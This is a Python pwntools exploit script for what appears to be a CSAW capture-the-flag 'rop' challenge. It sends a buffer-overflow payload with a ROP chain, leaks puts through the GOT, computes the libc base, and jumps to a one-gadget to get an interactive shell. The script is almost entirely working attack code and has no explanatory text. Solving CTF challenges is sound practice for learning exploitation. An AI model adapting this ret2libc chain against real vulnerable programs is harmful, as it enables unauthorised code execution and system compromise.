from pwn import *

elf = context.binary = ELF('./rop')
libc = ELF('/home/leo/Desktop/roppity/libc.so.6')

host = args.HOST or 'pwn.chal.csaw.io'
port = int(args.PORT or 5016)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()
MAIN = p64(0x4005dd)
POP_RDI_RET = p64(0x400683)
RBP = p64(0x7ffde2bde4c0)
paddings = 'A' * 32
payload = paddings + RBP + POP_RDI_RET + p64(elf.got['puts']) + p64(elf.sym['puts']) + MAIN

p.recvuntil('Hello\n')
p.sendline(payload)

data = p.recvline().strip()
leak = u64(data.ljust(8,"\x00"))
BASE_LIBC = leak - libc.sym['puts']
log.info("leaked libc base: " + hex(BASE_LIBC))

# gadgets
# 0x4f365
# 0x4f3c2
# 0x10a45c
gadget = p64(BASE_LIBC + 0x4f3c2)
payload = paddings + 'A' * 8 + gadget
p.recvuntil('Hello\n')
p.sendline(payload)

p.interactive()
p.close()